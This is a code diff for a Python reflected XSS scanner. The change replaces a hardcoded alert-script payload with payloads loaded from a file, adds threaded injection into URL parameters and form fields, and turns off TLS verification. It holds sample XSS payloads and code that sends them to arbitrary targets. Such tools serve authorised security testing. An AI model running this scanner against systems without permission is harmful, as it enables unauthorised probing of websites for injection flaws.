@@ -3,15 +3,22 @@ import requests
 import urllib.parse
 import random
 import string
+import urllib3
+import concurrent.futures
 from bs4 import BeautifulSoup
 
-def generate_payload():
-    marker = ''.join(random.choices(string.ascii_letters, k=8))
-    payload = f'\"<script>alert({marker})</script>'
-    return payload, marker
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-def inject_and_check(url, param):
-    payload, marker = generate_payload()
+def load_payloads(filepath):
+    with open(filepath, 'r', encoding='utf-8') as f:
+        return [line.strip() for line in f if line.strip()]
+
+def random_marker():
+    return ''.join(random.choices(string.ascii_letters, k=8))
+
+def inject_and_check(url, param, payload_template):
+    marker = random_marker()
+    payload = payload_template.replace('1', marker).replace('alert', 'alert')  # Keep basic structure
     parsed_url = urllib.parse.urlparse(url)
     query = dict(urllib.parse.parse_qsl(parsed_url.query))
     query[param] = payload
@@ -19,13 +26,13 @@ def inject_and_check(url, param):
     new_url = parsed_url._replace(query=new_query).geturl()
 
     try:
-        response = requests.get(new_url, timeout=10, verify=False)
+        response = requests.get(new_url, timeout=8, verify=False)
         if marker in response.text:
-            return True, new_url
+            return True, new_url, payload
     except requests.RequestException:
         pass
 
-    return False, None
+    return False, None, None
 
 def extract_params(url):
     parsed = urllib.parse.urlparse(url)
@@ -33,13 +40,13 @@ def extract_params(url):
 
 def find_forms(url):
     try:
-        response = requests.get(url, timeout=10, verify=False)
+        response = requests.get(url, timeout=8, verify=False)
         soup = BeautifulSoup(response.text, 'html.parser')
         return soup.find_all('form')
     except requests.RequestException:
         return []
 
-def form_injection(url, forms):
+def form_injection(url, forms, payloads):
     vulnerable = []
     for form in forms:
         action = form.get('action')
@@ -50,16 +57,15 @@ def form_injection(url, forms):
         for inp in inputs:
             name = inp.get('name')
             if name:
-                payload, marker = generate_payload()
-                data[name] = payload
+                data[name] = random.choice(payloads)
 
         form_url = urllib.parse.urljoin(url, action)
 
         try:
             if method == 'post':
-                resp = requests.post(form_url, data=data, timeout=10, verify=False)
+                resp = requests.post(form_url, data=data, timeout=8, verify=False)
             else:
-                resp = requests.get(form_url, params=data, timeout=10, verify=False)
+                resp = requests.get(form_url, params=data, timeout=8, verify=False)
 
             if any(payload in resp.text for payload in data.values()):
                 vulnerable.append(form_url)
@@ -69,29 +75,43 @@ def form_injection(url, forms):
     return vulnerable
 
 def main():
-    parser = argparse.ArgumentParser(description="Reflective XSS (rXSS) Detection Tool")
+    parser = argparse.ArgumentParser(description="Reflective XSS (rXSS) Detection Tool - Advanced Payloads with Multithreading")
     parser.add_argument("-u", "--url", required=True, help="Target URL to test")
     parser.add_argument("-f", "--full", action='store_true', help="Test forms along with GET parameters")
+    parser.add_argument("-p", "--payloads", default="reflective_xss_payloads.txt", help="Payloads file (default: reflective_xss_payloads.txt)")
+    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
     args = parser.parse_args()
 
+    payloads = load_payloads(args.payloads)
+
+    print(f"[+] Loaded {len(payloads)} payloads.")
     print("[+] Starting XSS scan on:", args.url)
 
     params = extract_params(args.url)
     if not params:
         print("[-] No query parameters found in URL.")
-    else:
-        for param in params:
-            found, attack_url = inject_and_check(args.url, param)
-            if found:
-                print(f"[!] Vulnerable parameter detected: {param}")
-                print(f"    Payload URL: {attack_url}")
-            else:
-                print(f"[-] {param} not vulnerable.")
+        return
+
+    for param in params:
+        print(f"[+] Testing parameter: {param}")
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
+            futures = []
+            for payload in payloads:
+                futures.append(executor.submit(inject_and_check, args.url, param, payload))
+
+            for future in concurrent.futures.as_completed(futures):
+                found, attack_url, payload_used = future.result()
+                if found:
+                    print(f"[!] Vulnerable parameter detected: {param}")
+                    print(f"    Payload URL: {attack_url}")
+                    print(f"    Payload used: {payload_used}")
+                    break  # Found one, no need to keep testing same param
 
     if args.full:
         print("\n[+] Scanning forms...")
         forms = find_forms(args.url)
-        vulnerable_forms = form_injection(args.url, forms)
+        vulnerable_forms = form_injection(args.url, forms, payloads)
 
         if vulnerable_forms:
             for vf in vulnerable_forms:
